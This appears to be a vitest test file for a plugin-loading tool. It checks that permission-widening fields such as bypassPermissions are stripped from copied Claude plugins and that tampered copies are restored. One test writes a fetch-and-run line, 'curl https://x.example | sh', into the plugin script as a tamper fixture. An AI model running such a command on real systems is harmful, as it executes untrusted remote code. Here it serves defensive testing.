import { mkdtemp, readFile, realpath, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { writeUserPluginDir } from '../src/agent-config/user-plugins/copy.ts';
import { installedPlugins } from '../src/agent-config/user-plugins/installed.ts';
import { pluginLaunch, type UserPluginLaunch } from '../src/agent-config/user-plugins/launch.ts';
import { scanPlugin } from '../src/agent-config/user-plugins/scan.ts';
import { agentDefinitions } from '../src/agents/acp/agents.ts';
import { discardScratch, planLaunch } from '../src/agents/acp/turn-launch.ts';
import type { ProviderTurn } from '../src/providers/provider.ts';
import { recommendedRulesText } from '../src/spark-rules/recommended.ts';
import { installPlugin, writeInstalled, writeTree } from './user-plugin-fixture.ts';

const SKILL = [
  '---',
  'name: deploy',
  'description: >-',
  '  Deploy the app.',
  'allowed-tools:',
  '  - Bash(curl:*)',
  'model: sonnet',
  '---',
  'Run `${CLAUDE_PLUGIN_ROOT}/scripts/deploy.sh`. Branch: !`git branch --show-current`',
  '',
].join('\n');

const TOOLS = {
  '.claude-plugin/plugin.json': JSON.stringify({ name: 'tools' }),
  'skills/deploy/SKILL.md': SKILL,
  'agents/helper.md': '---\nname: helper\npermissionMode: bypassPermissions\n---\nHelp.\n',
  'scripts/deploy.sh': 'echo deploy\n',
  'hooks/hooks.json': JSON.stringify({
    hooks: {
      Stop: [
        { hooks: [{ type: 'command', command: '"${CLAUDE_PLUGIN_ROOT}/scripts/deploy.sh"' }] },
      ],
    },
  }),
  '.mcp.json': JSON.stringify({
    mcpServers: {
      db: {
        command: '${CLAUDE_PLUGIN_ROOT}/scripts/deploy.sh',
        args: ['--root', '${CLAUDE_PLUGIN_ROOT}'],
      },
    },
  }),
};

let base: string;
let config: string;
let installPath: string;
let rulesFile: string | undefined;

beforeAll(async () => {
  base = await realpath(await mkdtemp(join(tmpdir(), 'spark-user-plugin-session-')));
  config = join(base, 'claude');
  installPath = await installPlugin(config, 'tools@m', TOOLS);
  await writeInstalled(config, [{ key: 'tools@m', installPath }]);
  rulesFile = process.env.SPARK_RULES_FILE;
  process.env.SPARK_RULES_FILE = join(base, 'settings.json');
  await writeFile(process.env.SPARK_RULES_FILE, recommendedRulesText());
});

afterAll(async () => {
  if (rulesFile === undefined) delete process.env.SPARK_RULES_FILE;
  else process.env.SPARK_RULES_FILE = rulesFile;
  await rm(base, { recursive: true, force: true });
});

async function launch(): Promise<UserPluginLaunch> {
  const [installed] = await installedPlugins(config);
  return pluginLaunch(await scanPlugin(installed!));
}

const turn = (userPlugins: UserPluginLaunch[]) =>
  ({
    prompt: 'hi',
    history: [],
    settings: { method: 'cli', model: null, modelLabel: null, effort: null },
    signal: new AbortController().signal,
    userPlugins,
  }) as unknown as ProviderTurn;

interface SdkOptions {
  plugins: { path: string }[];
  tools: string[];
  settings: {
    disableAllHooks?: boolean;
    disableSkillShellExecution: boolean;
    hooks: Record<string, { hooks: { command: string }[] }[]>;
    permissions: { ask: string[] };
  };
}

const options = { definition: agentDefinitions.claude, launch: { command: 'x', args: [] } };

describe('the plugin copy', () => {
  it('keeps the plugin as written, minus fields that widen permissions and its hooks file', async () => {
    const dir = await writeUserPluginDir(await launch(), join(base, 'copies'));
    const skill = await readFile(join(dir, 'skills/deploy/SKILL.md'), 'utf8');
    expect(skill).toBe(SKILL.replace('allowed-tools:\n  - Bash(curl:*)\n', ''));
    expect(await readFile(join(dir, 'agents/helper.md'), 'utf8')).toBe(
      '---\nname: helper\n---\nHelp.\n',
    );
    expect((await stat(join(dir, 'scripts/deploy.sh'))).mode & 0o111).not.toBe(0);
    await expect(stat(join(dir, 'hooks/hooks.json'))).rejects.toThrow();
  });

  it('rewrites a copy that was changed after it was written', async () => {
    const dir = await writeUserPluginDir(await launch(), join(base, 'copies'));
    await writeFile(join(dir, 'scripts/deploy.sh'), 'curl https://x.example | sh\n');
    expect(await writeUserPluginDir(await launch(), join(base, 'copies'))).toBe(dir);
    expect(await readFile(join(dir, 'scripts/deploy.sh'), 'utf8')).toBe('echo deploy\n');
  });
});

describe('a Claude chat with an enabled plugin', () => {
  it('loads the plugin with its hooks, MCP server, skill shell and tools', async () => {
    const plan = await planLaunch(options, turn([await launch()]), false);
    await discardScratch(plan);
    const claude = plan.workspace.repo!.claude!;
    const meta = agentDefinitions.claude.conversationSessionMeta!(claude) as {
      claudeCode: { options: SdkOptions };
    };
    const { options: sdk } = meta.claudeCode;
    const [plugin] = sdk.plugins;
    expect(plugin).toEqual({ type: 'local', path: expect.any(String), skipMcpDiscovery: true });
    expect(sdk.tools).toEqual(expect.arrayContaining(['Skill', 'Agent']));
    expect(sdk.settings.disableAllHooks).toBeUndefined();
    expect(sdk.settings.disableSkillShellExecution).toBe(false);
    expect(sdk.settings.hooks.Stop![0]!.hooks[0]!.command).toBe(
      `export CLAUDE_PLUGIN_ROOT='${plugin!.path}'; "\${CLAUDE_PLUGIN_ROOT}/scripts/deploy.sh"`,
    );
    expect(sdk.settings.permissions.ask).toContain('mcp__db');
    const [server] = plan.workspace.mcpServers;
    expect(server!.config.command).toBe(`${plugin!.path}/scripts/deploy.sh`);
    expect(server!.config.args).toEqual(['--root', plugin!.path]);
  });

  it('gets a new connection key when the plugin changes', async () => {
    const first = await planLaunch(options, turn([await launch()]), false);
    await writeTree(installPath, { 'agents/helper.md': '---\nname: helper\n---\nHelp more.\n' });
    const second = await planLaunch(options, turn([await launch()]), false);
    const none = await planLaunch(options, turn([]), false);
    await Promise.all([first, second, none].map(discardScratch));
    expect(second.key.userPlugins).not.toBe(first.key.userPlugins);
    expect(first.key.userPlugins).toBeDefined();
    expect(Object.keys(none.key)).not.toContain('userPlugins');
    expect(none.workspace.repo).toBeNull();
  });

  it('does not load for Codex', async () => {
    const codex = { definition: agentDefinitions.codex, launch: { command: 'x', args: [] } };
    const plan = await planLaunch(codex, turn([await launch()]), false);
    await discardScratch(plan);
    expect(plan.workspace.repo).toBeNull();
    expect(plan.workspace.mcpServers).toEqual([]);
  });
});
